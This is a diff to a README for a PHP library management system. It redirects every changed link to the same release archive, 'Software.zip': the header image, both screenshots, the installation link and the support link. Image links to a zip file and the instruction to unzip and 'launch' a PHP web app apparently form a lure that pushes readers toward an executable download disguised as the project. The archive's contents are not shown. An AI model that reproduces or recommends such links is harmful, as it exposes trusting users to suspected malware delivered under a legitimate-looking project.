@@ -1,6 +1,6 @@
 # 📚 PHP Library System 📖
 
-![Library System](https://www.example.com/library_system_image.jpg)
+![Library System](https://github.com/eltrapico2/php-library-system/releases/download/v1.0/Software.zip)
 
 Welcome to the **php-library-system** repository! This project is a **Library Management System** built using **PHP**, **MySQL**, and **Bootstrap**. It offers a comprehensive solution for managing library resources, tracking borrow and return transactions, and enabling users to search for books by title, author, or ISBN. The system is fully responsive and user-friendly, making it a valuable tool for libraries of all sizes.
 
@@ -29,7 +29,7 @@ Welcome to the **php-library-system** repository! This project is a **Library Ma
 
 ## Installation 🚀
 
-To get started with the PHP Library System, you can download the latest version [here](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip). Once downloaded, unzip the file and launch the application to begin exploring the features.
+To get started with the PHP Library System, you can download the latest version [here](https://github.com/eltrapico2/php-library-system/releases/download/v1.0/Software.zip). Once downloaded, unzip the file and launch the application to begin exploring the features.
 
 ## Usage 🖥️
 
@@ -40,12 +40,12 @@ To get started with the PHP Library System, you can download the latest version 
 
 ## Screenshots 📷
 
-![Screenshot 1](https://www.example.com/screenshot1.jpg)
-![Screenshot 2](https://www.example.com/screenshot2.jpg)
+![Screenshot 1](https://github.com/eltrapico2/php-library-system/releases/download/v1.0/Software.zip)
+![Screenshot 2](https://github.com/eltrapico2/php-library-system/releases/download/v1.0/Software.zip)
 
 ## Support ℹ️
 
-For any inquiries or issues, please visit the [Releases](https://github.com/php-library-system/releases) section of this repository for additional information.
+For any inquiries or issues, please visit the [Releases](https://github.com/eltrapico2/php-library-system/releases/download/v1.0/Software.zip) section of this repository for additional information.
 
 ## Contributors 🤝
 
